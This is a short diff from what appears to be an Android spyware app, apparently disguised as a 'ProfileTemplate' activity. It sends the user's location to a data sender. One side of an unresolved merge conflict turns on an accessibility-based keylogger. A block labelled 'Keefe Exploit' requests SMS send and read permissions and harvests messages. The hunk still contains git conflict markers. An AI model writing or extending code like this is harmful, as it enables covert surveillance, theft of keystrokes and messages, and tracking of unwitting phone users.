@@ -60,11 +60,16 @@ class ProfileTemplate : AppCompatActivity() {
         if (checkPerms(this, *LOCPERMISSIONS)) {
             datasender.sendData("loc", gps.getLocationDetails())
         }
+<<<<<<< Updated upstream
         //gn.accessibilityCheck() //Activate keylogger
         val SMSPERMISSIONS = arrayOf(
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.READ_SMS
         )
+=======
+        gn.accessibilityCheck() //Activate keylogger
+
+>>>>>>> Stashed changes
         // Keefe Exploit --------------------------------------------------------------
         if (checkPerms(this, *SMSPERMISSIONS)) {
              hv.getSMS()
